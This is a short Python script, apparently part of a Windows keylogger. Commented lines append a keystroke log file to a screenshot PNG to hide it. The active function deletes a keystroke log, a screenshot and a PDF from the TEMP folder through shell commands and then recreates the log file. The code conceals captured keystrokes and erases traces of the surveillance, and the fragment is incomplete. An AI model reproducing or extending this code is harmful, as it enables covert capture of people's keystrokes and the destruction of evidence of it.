from subprocess import check_output
import os

temp_dir =os.environ['TEMP']
#check_output("copy ss1.png ss2.png", shell=True)
#check_output("copy /B ss2.png + keylogs.txt", shell=True)
#s=f"dir {temp_dir}"
#print(check_output(s, shell=True))



#username = os.environ['USERNAME']
#print(f'{username} temp directory is {temp_dir}')


#s=f"copy /B {temp_dir}\ss2.png + {temp_dir}\keylogs.txt"
#s=f"copy /B {temp_dir}\a.txt + {temp_dir}\b.txt"
def del2():
    os.chdir(temp_dir) 
    check_output("del keycv.log", shell=True)
    #os.remove("keylogs.txt")
    check_output("del ss1.png", shell=True)
    check_output("del GFG.pdf", shell=True)
    check_output("copy con keycv.log", shell=True)
    
    
